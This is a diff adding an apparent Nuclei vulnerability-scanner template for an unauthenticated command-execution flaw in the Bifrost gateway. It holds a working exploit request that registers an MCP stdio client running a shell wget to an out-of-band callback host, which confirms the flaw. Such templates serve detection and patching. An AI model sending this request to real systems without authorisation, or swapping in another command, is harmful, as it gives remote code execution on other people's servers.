@@ -1,0 +1,40 @@
+id: CVE-2026-90898
+
+info:
+  name: Bifrost < 2.1.0 - Unauthenticated MCP Stdio Command Execution
+  author: alex700
+  severity: critical
+  description: |
+    When dashboard authentication is disabled, Bifrost accepts an unauthenticated stdio MCP client registration and starts its configured command before the MCP handshake completes. This template runs a benign outbound HTTP request from the target and requires an out-of-band callback to confirm command execution.
+  impact: |
+    An unauthenticated network caller can execute a command with the privileges of the Bifrost gateway process.
+  remediation: |
+    Upgrade Bifrost to transports v2.1.0 or later and enable dashboard authentication.
+  reference:
+    - https://github.com/maximhq/bifrost/pull/6757
+  classification:
+    cve-id: CVE-2026-90898
+    cwe-id: CWE-78
+  metadata:
+    max-request: 1
+    vendor: maximhq
+    product: bifrost
+  tags: cve,cve2026,bifrost,rce,oast,intrusive
+
+variables:
+  client_name: "nuclei_{{rand_text_alpha(10)}}"
+
+http:
+  - raw:
+      - |
+        @timeout: 45s
+        POST /api/mcp/client HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name":"{{client_name}}","connection_type":"stdio","stdio_config":{"command":"/bin/sh","args":["-c","wget -q -O /dev/null http://{{interactsh-url}}/bifrost-90898"]},"tools_to_execute":["*"]}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500 && contains(body, "context deadline exceeded") && contains(interactsh_protocol, "http")'
